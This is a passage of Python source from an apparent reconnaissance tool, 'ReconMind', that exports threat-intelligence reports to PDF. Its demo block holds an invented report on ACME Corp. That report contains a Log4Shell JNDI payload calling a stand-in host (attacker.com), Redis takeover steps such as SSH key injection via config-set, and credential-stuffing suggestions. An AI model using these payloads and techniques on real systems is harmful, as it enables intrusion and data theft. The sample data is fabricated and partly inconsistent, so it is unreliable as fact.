    target = _safe(report.get("target"), "unknown")
    _info(f"Target : {target}")
    _info(f"Risk   : {report.get('risk_level', 'N/A')}  ({report.get('risk_score', 0)}/100)")

    # ── Ensure output directory exists ───────────────────────────
    try:
        _ensure_dir(output_dir)
        _ok(f"Output directory: {os.path.abspath(output_dir)}")
    except OSError as e:
        _err(f"Cannot create output directory: {e}")
        return ""

    # ── Build file path ───────────────────────────────────────────
    pdf_path = _build_filename(target, "report", output_dir)
    _info(f"Writing: {pdf_path}")

    # ── Build story ───────────────────────────────────────────────
    _info("Composing report content …")
    try:
        styles         = _make_styles()
        total_pages    = [None]   # mutable container for page count back-fill
        story          = []

        story += _build_cover(report, styles, is_summary=False)
        story += _build_error_notice(report, styles)
        story += _build_summary_section(report, styles)
        story += _build_findings_section(report, styles)
        story += _build_threats_section(report, styles)
        story += _build_recommendations_section(report, styles)
        story += _build_cve_table(report, styles)
        story += _build_full_report_section(report, styles)

    except Exception as e:
        _err(f"Story composition failed: {e}")
        return ""

    # ── Render PDF (first pass — page count unknown) ──────────────
    _info("Rendering PDF (first pass) …")
    try:
        doc = _build_doc(pdf_path, total_pages)
        doc.build(
            story,
            onFirstPage  = doc._onFirstPage,
            onLaterPages = doc._onLaterPages,
        )
    except Exception as e:
        _err(f"PDF build failed: {e}")
        return ""

    # ── Back-fill page count and re-render ────────────────────────
    page_count = _get_page_count(pdf_path)
    if page_count:
        total_pages[0] = page_count
        _info(f"Re-rendering with page count = {page_count} …")
        try:
            # Rebuild story (styles are stateless so this is safe)
            story  = []
            story += _build_cover(report, styles, is_summary=False)
            story += _build_error_notice(report, styles)
            story += _build_summary_section(report, styles)
            story += _build_findings_section(report, styles)
            story += _build_threats_section(report, styles)
            story += _build_recommendations_section(report, styles)
            story += _build_cve_table(report, styles)
            story += _build_full_report_section(report, styles)

            doc = _build_doc(pdf_path, total_pages)
            doc.build(
                story,
                onFirstPage  = doc._onFirstPage,
                onLaterPages = doc._onLaterPages,
            )
        except Exception as e:
            _warn(f"Second-pass render failed ({e}); using first-pass output.")

    # ── Done ──────────────────────────────────────────────────────
    abs_path = os.path.abspath(pdf_path)
    size_kb  = os.path.getsize(abs_path) // 1024
    _ok(f"PDF saved: {abs_path}  ({size_kb} KB)")
    _info("=" * 55)
    return abs_path


def export_pdf_summary(report: dict, output_dir: str = "output/reports") -> str:
    """
    Generate a compact one-page (or minimal-page) summary PDF.

    Contains: Cover page + Summary + Top-5 findings + Top-5 threats
              + Top-5 recommendations. No full report or CVE table.

    Args:
        report    : dict from groq_analysis.analyze_target()
        output_dir: directory path where the PDF is saved

    Returns:
        Absolute path to the saved PDF file, or empty string on failure.
    """
    _info("=" * 55)
    _info("ReconMind PDF Exporter — Summary Report")
    _info("=" * 55)

    if not isinstance(report, dict):
        _err(f"export_pdf_summary() expects a dict, received {type(report)}")
        return ""

    target = _safe(report.get("target"), "unknown")
    _info(f"Target : {target}")

    try:
        _ensure_dir(output_dir)
    except OSError as e:
        _err(f"Cannot create output directory: {e}")
        return ""

    pdf_path = _build_filename(target, "summary", output_dir)
    _info(f"Writing: {pdf_path}")

    # ── Build trimmed report with top-N items only ────────────────
    trimmed = dict(report)
    trimmed["findings"]        = (report.get("findings")        or [])[:5]
    trimmed["threats"]         = (report.get("threats")         or [])[:5]
    trimmed["recommendations"] = (report.get("recommendations") or [])[:5]

    _info("Composing summary content …")
    try:
        styles      = _make_styles()
        total_pages = [None]
        story       = []

        story += _build_cover(trimmed, styles, is_summary=True)
        story += _build_error_notice(trimmed, styles)
        story += _build_summary_section(trimmed, styles)
        story += _build_findings_section(trimmed, styles)
        story += _build_threats_section(trimmed, styles)
        story += _build_recommendations_section(trimmed, styles)

    except Exception as e:
        _err(f"Story composition failed: {e}")
        return ""

    _info("Rendering summary PDF …")
    try:
        doc = _build_doc(pdf_path, total_pages)
        doc.build(
            story,
            onFirstPage  = doc._onFirstPage,
            onLaterPages = doc._onLaterPages,
        )
    except Exception as e:
        _err(f"PDF build failed: {e}")
        return ""

    # Back-fill page count
    page_count = _get_page_count(pdf_path)
    if page_count:
        total_pages[0] = page_count
        try:
            story  = []
            story += _build_cover(trimmed, styles, is_summary=True)
            story += _build_error_notice(trimmed, styles)
            story += _build_summary_section(trimmed, styles)
            story += _build_findings_section(trimmed, styles)
            story += _build_threats_section(trimmed, styles)
            story += _build_recommendations_section(trimmed, styles)

            doc = _build_doc(pdf_path, total_pages)
            doc.build(
                story,
                onFirstPage  = doc._onFirstPage,
                onLaterPages = doc._onLaterPages,
            )
        except Exception as e:
            _warn(f"Second-pass render failed ({e}); using first-pass output.")

    abs_path = os.path.abspath(pdf_path)
    size_kb  = os.path.getsize(abs_path) // 1024
    _ok(f"Summary PDF saved: {abs_path}  ({size_kb} KB)")
    _info("=" * 55)
    return abs_path


# ══════════════════════════════════════════════════════════════════
#  DIRECT TEST / DEMO
# ══════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    """
    Self-contained demo using realistic fake report data.
    Run directly:  python pdf_export.py
    Both a full report and a summary PDF will be written to
    ./output/reports/
    """

    sample_report = {
        "target":     "192.168.100.50",
        "risk_score": 78,
        "risk_level": "HIGH",

        "summary": (
            "Target 192.168.100.50, attributed to ACME Corp (United States), presents "
            "a HIGH risk profile based on multi-source OSINT intelligence gathered by "
            "the ReconMind engine. Active exploitation vectors exist via CVE-2021-44228 "
            "(Log4Shell, CVSS 10.0) on an internet-facing Apache service, and an "
            "unauthenticated Redis instance on port 6379 exposes the entire data store "
            "to any external actor.\n\n"
            "Credential intelligence confirms that the primary administrative email "
            "address has appeared in three separate public breach repositories, "
            "substantially increasing the probability of account takeover through "
            "credential-stuffing campaigns. Additionally, a publicly accessible GitHub "
            "repository named 'api-keys-backup' may contain historical secrets, and "
            "Google Dork analysis has surfaced a plaintext .env file and a compressed "
            "database backup accessible without authentication.\n\n"
            "Immediate containment and remediation action is required within 24–48 "
            "hours to prevent active exploitation of the identified attack surface."
        ),

        "findings": [
            "Redis 6.2.6 running on port 6379 with NO authentication — full read/write/exec access from internet",
            "CVE-2021-44228 (Log4Shell, CVSS 10.0) detected on Apache 2.4.6 (port 80) — RCE trivially exploitable",
            "CVE-2022-0778 (OpenSSL infinite loop, CVSS 7.5) present on HTTPS service (port 443)",
            "admin@acmecorp.com confirmed in 3 breach databases: Adobe (2013), LinkedIn (2016), RockYou2021",
            "GitHub repository 'api-keys-backup' publicly accessible — potential credential/infrastructure exposure",
            "Domain acmecorp.com expires within 30 days — domain hijacking risk if renewal lapses",
            ".env file containing DB_PASSWORD visible via Google Dork (site:acmecorp.com ext:env)",
            "Compressed SQL backup file (backup_2023.sql.gz) accessible on public web root",
            "MySQL 5.7.38 on port 3306 exposed to internet — known EOL version with unpatched CVEs",
            "5 platform footprints identified across Twitter, LinkedIn, Instagram, GitHub, Reddit",
        ],

        "threats": [
            "Remote Code Execution via Log4Shell (CVE-2021-44228) — exploit kits freely available, actively exploited",
            "Full Redis database compromise enabling data exfiltration, ransomware, cron-based persistence",
            "Credential stuffing attack using admin@acmecorp.com plaintext passwords from RockYou2021 (8.4B entries)",
            "Domain hijacking of acmecorp.com if registration lapses — enables phishing and MX record takeover",
            "Sensitive API key and infrastructure secret extraction from public GitHub repository",
            "Database credential theft from publicly accessible .env file — full backend compromise possible",
            "SQL injection and data exfiltration via EOL MySQL 5.7 (CVE-2022-21427, CVE-2022-21417)",
            "Denial-of-Service via OpenSSL infinite loop (CVE-2022-0778) targeting HTTPS service",
        ],

        "recommendations": [
            "CRITICAL (24h): Patch Apache / Log4j to version 2.17.1+ to remediate CVE-2021-44228",
            "CRITICAL (24h): Add requirepass to Redis config; bind to 127.0.0.1; block port 6379 at firewall",
            "HIGH (48h): Rotate ALL credentials associated with admin@acmecorp.com on every platform",
            "HIGH (48h): Remove or password-protect .env file and backup_2023.sql.gz from web root",
            "HIGH (48h): Renew acmecorp.com domain immediately; enable auto-renew; configure expiry alerts",
            "MEDIUM (7d): Archive or make private the 'api-keys-backup' GitHub repo; rotate exposed secrets",
            "MEDIUM (7d): Upgrade OpenSSL to 3.0.2+ to remediate CVE-2022-0778",
            "MEDIUM (7d): Migrate from EOL MySQL 5.7 to MySQL 8.0+ or switch to PostgreSQL",
            "LOW (30d): Implement WAF rules to detect and block JNDI injection attempts",
            "LOW (30d): Conduct full infrastructure security review and penetration test",
        ],

        "full_report": """\
# Threat Intelligence Report — 192.168.100.50
**Classification:** TLP:AMBER | **Date:** 2026-05-25 | **Prepared by:** ReconMind AI Engine

---

## Executive Summary

Target 192.168.100.50, attributed to ACME Corp (United States), presents a HIGH threat
profile based on corroborated multi-source OSINT analysis. The combination of an
exploitable critical-severity RCE vulnerability, an unauthenticated data store, and
publicly breached administrative credentials creates a high-probability compromise
scenario requiring immediate action.

---

## Target Overview

- **IP Address:** 192.168.100.50
- **Organisation:** ACME Corp
- **Country:** United States (US)
- **Open Ports:** 22/SSH, 80/HTTP, 443/HTTPS, 3306/MySQL, 6379/Redis
- **Domain:** acmecorp.com | Registrar: GoDaddy LLC | Created: 2005-03-22 | Expires: 2025-03-22
- **GitHub:** github.com/acme-devops — 14 public repositories, 42 followers

---

## Key Findings

1. CVE-2021-44228 (Log4Shell) — CVSS 10.0 CRITICAL on Apache 2.4.6 port 80. Allows unauthenticated
   remote code execution via JNDI injection. Widely exploited in the wild since December 2021.

2. Unauthenticated Redis — Port 6379 accepts connections without credentials. An attacker can
   dump keys, write arbitrary files (webshell via config rewrite), or inject cron jobs for persistence.

3. Credential Breach — admin@acmecorp.com present in Adobe (2013), LinkedIn (2016), RockYou2021.
   Enables credential stuffing, password spray, and social engineering campaigns.

4. Exposed Secrets — .env file with DB_PASSWORD and backup_2023.sql.gz are publicly accessible
   without authentication, discovered via standard Google Dork queries.

---

## Threat Analysis

### Remote Code Execution (CVE-2021-44228)
Log4Shell remains one of the most dangerous vulnerabilities ever disclosed. Exploitation requires
no authentication and is achievable by injecting ${jndi:ldap://attacker.com/x} into any
HTTP header that is subsequently logged. Public exploit frameworks automate the entire chain.

Estimated time-to-exploit for a motivated threat actor: less than 15 minutes with public tooling.

### Redis Takeover
Unauthenticated Redis instances are a primary initial access vector in cloud and data centre
breaches. Common post-exploitation paths include: full database dump, SSH key injection via
config-set dir/dbfilename, webshell deployment, and lateral movement to internal subnets.

### Credential Intelligence
The RockYou2021 list contains over 8.4 billion plaintext and hashed passwords. With
admin@acmecorp.com confirmed in this dataset, automated credential stuffing tools such as
Hydra, Medusa, or Burp Intruder can attack SSH (port 22) and any web login pages.

---

## Vulnerability Assessment

| CVE              | CVSS  | Affected Service  | Exploitability         |
|------------------|-------|-------------------|------------------------|
| CVE-2021-44228   | 10.0  | Apache 2.4.6 :80  | CRITICAL — PoC public  |
| CVE-2022-0778    |  7.5  | OpenSSL :443      | HIGH — DoS vector      |
| CVE-2022-21427   |  6.5  | MySQL 5.7.38 :3306| MEDIUM — auth bypass   |

---

## Digital Footprint Analysis

Social Scan identified the 'acmecorp' username on 5 platforms: Twitter, LinkedIn, Instagram,
GitHub, and Reddit. The GitHub organisation (acme-devops) hosts 14 public repositories,
including one named 'api-keys-backup' whose description reads "DO NOT USE — legacy", suggesting
it may contain sensitive historical configuration data.

---

## Recommendations

1. Patch CVE-2021-44228 — upgrade Log4j to 2.17.1+ or apply vendor hotfix within 24 hours.
2. Authenticate Redis — add requirepass, bind to loopback, block 6379 at the perimeter firewall.
3. Rotate all credentials for admin@acmecorp.com across SSH, web portals, and third-party SaaS.
4. Remove .env and backup.sql.gz from public web root; audit web server directory listings.
5. Renew acmecorp.com domain and enable auto-renew before the 2025-03-22 expiry date.

---

## Conclusion

ACME Corp's internet-facing infrastructure presents an immediate and material risk of
compromise. The convergence of a 10.0 CVSS vulnerability with unauthenticated services and
publicly breached credentials demands an emergency response posture, not a routine patch cycle.

**Recommended timeline:** 24h — critical CVE + Redis hardening. 48h — credential rotation
and secret cleanup. 7 days — full infrastructure security review and penetration test.
""",

        "error": None,
    }

    print(f"\n{Fore.MAGENTA}{Style.BRIGHT}  ══ ReconMind PDF Export Demo ══{Style.RESET_ALL}\n")

    # ── Generate full report ──────────────────────────────────────
    full_path = export_pdf(sample_report, output_dir="output/reports")
    if full_path:
        print(f"\n{Fore.GREEN}  Full report → {full_path}{Style.RESET_ALL}")
    else:
        print(f"\n{Fore.RED}  Full report generation FAILED.{Style.RESET_ALL}")

    # ── Generate summary report ───────────────────────────────────
    summary_path = export_pdf_summary(sample_report, output_dir="output/reports")
    if summary_path:
        print(f"{Fore.GREEN}  Summary     → {summary_path}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}  Summary generation FAILED.{Style.RESET_ALL}")

    print(f"\n{Fore.CYAN}  Both PDFs saved to ./output/reports/{Style.RESET_ALL}\n")
